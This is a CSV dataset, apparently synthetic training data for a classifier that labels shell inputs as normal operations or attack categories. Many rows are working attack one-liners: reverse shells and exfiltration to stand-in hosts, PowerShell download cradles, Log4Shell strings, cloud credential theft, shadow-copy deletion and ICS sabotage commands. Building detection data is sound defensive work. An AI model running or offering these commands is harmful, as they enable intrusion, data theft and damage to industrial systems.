timestamp,src_ip,input,label
2026-01-20T18:06:49.586561,14.82.98.65,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.614343,19.206.205.91,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.639217,35.20.125.92,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.643231,33.70.69.119,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,53.93.69.22,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.601211,111.29.163.66,whoami,Normal_Business_Ops
2026-01-20T18:06:49.597537,219.114.124.123,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.619055,160.96.194.36,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.586561,153.122.33.123,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.593923,179.230.90.70,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.611343,124.111.163.171,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.636464,84.114.138.133,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.603716,3.187.27.139,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.624776,32.88.44.242,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.625855,143.197.128.82,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.629483,126.228.240.147,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.655635,80.134.157.157,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.607717,30.242.110.57,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.576929,144.95.128.126,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.589562,83.109.130.181,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.619055,41.161.19.70,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.584995,175.184.49.118,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.617074,185.139.214.109,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.652043,93.158.208.56,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.613343,56.151.113.241,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.656632,194.20.236.33,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.581995,106.166.122.158,git branch,Normal_Business_Ops
2026-01-20T18:06:49.596536,132.86.173.64,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.630463,221.37.237.139,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.605716,135.119.139.234,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.614343,94.195.117.133,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.608346,127.81.105.101,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.640252,63.199.241.112,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.629483,210.202.194.46,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.629483,97.70.237.232,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.614343,196.165.217.184,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.613343,98.171.19.23,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.639724,26.41.72.20,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.640252,183.231.134.3,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.609343,137.98.12.143,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.582995,114.38.230.1,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.654031,135.180.54.163,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.617074,3.186.57.234,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.648870,59.161.57.246,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.632463,85.88.30.215,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.597537,203.202.169.69,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.599537,108.88.157.85,git pull,Normal_Business_Ops
2026-01-20T18:06:49.596536,16.14.2.132,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.625855,147.14.99.224,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.656632,140.126.216.179,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.647820,61.96.62.189,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.582995,91.230.107.14,git status,Normal_Business_Ops
2026-01-20T18:06:49.585564,182.24.199.173,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.586561,12.212.165.140,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.607717,68.28.118.227,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645823,10.248.118.130,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.607717,26.97.88.39,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.638465,200.221.182.192,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.593923,31.226.93.44,make build,Normal_Business_Ops
2026-01-20T18:06:49.578927,72.94.31.126,git add .,Normal_Business_Ops
2026-01-20T18:06:49.621712,219.88.114.95,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.578927,29.231.188.131,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.576929,153.114.65.214,df -h,Normal_Business_Ops
2026-01-20T18:06:49.609343,1.104.101.110,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.624776,105.127.4.108,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.601211,206.158.4.106,git status,Normal_Business_Ops
2026-01-20T18:06:49.592928,201.242.75.177,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.591206,193.91.62.209,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.628852,14.232.152.175,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.627851,47.187.237.9,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.584995,53.145.36.63,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.637464,47.165.213.74,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.587562,72.59.125.239,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.633463,114.68.92.131,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.601728,219.24.167.32,git pull,Normal_Business_Ops
2026-01-20T18:06:49.639217,189.186.180.41,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.592928,195.244.35.136,git branch,Normal_Business_Ops
2026-01-20T18:06:49.613343,100.132.188.80,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.609343,10.204.40.153,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.584995,30.91.175.47,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.632463,182.156.93.113,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.608346,95.196.128.83,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.603716,110.100.57.114,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.634463,138.161.49.137,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.615344,1.51.134.155,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.597537,78.112.179.170,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.626851,105.132.171.45,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.621712,105.249.102.84,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.626851,147.199.71.156,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.645231,184.254.3.52,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.641230,15.63.90.70,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.611343,48.76.222.33,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.601728,177.28.111.247,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.600538,114.28.17.37,git add .,Normal_Business_Ops
2026-01-20T18:06:49.656632,108.116.218.127,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.596536,156.1.167.167,uptime,Normal_Business_Ops
2026-01-20T18:06:49.646819,45.228.54.236,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.625323,109.176.156.124,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.611343,48.96.186.18,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.644231,18.254.55.245,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.637464,81.172.193.16,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.604716,101.182.61.220,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.637464,153.49.20.125,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.644231,96.183.125.16,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.605716,191.65.226.196,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.587562,64.191.239.72,git status,Normal_Business_Ops
2026-01-20T18:06:49.587562,70.244.45.78,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.576929,23.22.224.190,make build,Normal_Business_Ops
2026-01-20T18:06:49.625345,116.248.179.58,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.606716,153.101.178.97,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.610343,197.66.81.103,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.624262,42.96.48.93,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.653031,70.150.208.72,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.577927,147.69.216.42,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.588562,207.196.192.231,git add .,Normal_Business_Ops
2026-01-20T18:06:49.597537,64.220.231.1,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.595541,80.49.237.189,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.652043,85.145.219.58,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.580995,40.240.95.4,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.651526,196.19.242.239,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.580022,102.192.57.72,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.618055,216.183.249.217,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.611343,221.121.235.243,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.577927,42.1.130.29,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.618055,69.222.167.81,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.627851,25.185.87.58,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.619742,44.219.123.119,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.644231,131.0.86.132,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.610343,11.55.56.185,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,178.230.34.177,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.650820,121.53.136.136,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.577927,83.14.127.82,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.594923,80.231.46.114,whoami,Normal_Business_Ops
2026-01-20T18:06:49.599537,113.231.81.119,uptime,Normal_Business_Ops
2026-01-20T18:06:49.583995,164.19.242.46,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.593923,67.104.94.157,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.621712,7.142.35.65,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.620713,142.12.1.91,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,138.34.186.128,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.624776,86.73.143.99,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.604716,101.11.83.38,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.598537,194.15.130.240,git branch,Normal_Business_Ops
2026-01-20T18:06:49.622713,86.102.55.149,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.599537,95.206.200.34,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.652043,119.71.66.18,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.644231,4.5.48.3,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.629483,160.97.220.249,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.655635,205.201.79.116,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.644231,220.18.54.11,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.626851,78.69.35.10,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,53.145.165.146,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.635464,25.57.211.88,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.620713,107.135.3.38,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.654619,88.15.201.5,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.642230,44.200.44.41,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.590224,135.158.111.33,git branch,Normal_Business_Ops
2026-01-20T18:06:49.612343,98.12.86.169,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.610343,2.71.245.78,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.645823,134.234.238.54,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.577927,106.180.195.162,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.590224,105.82.159.204,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.643231,101.158.95.96,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.627851,164.38.186.101,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.642230,128.174.13.196,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.626851,117.172.193.171,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.621712,129.47.113.81,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.630463,219.40.233.118,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.611343,27.215.60.87,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.582995,209.141.4.231,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.616344,204.73.53.164,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.615344,219.112.226.12,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.601728,195.252.122.218,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.649821,11.61.187.5,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.645823,24.173.45.110,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.636464,165.204.7.152,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.625855,41.96.58.48,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.604716,109.79.88.141,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.581995,6.213.25.146,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.654619,152.51.85.126,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.618055,100.161.70.16,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.620713,147.211.25.220,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.625345,163.173.30.135,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.606716,181.226.51.120,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
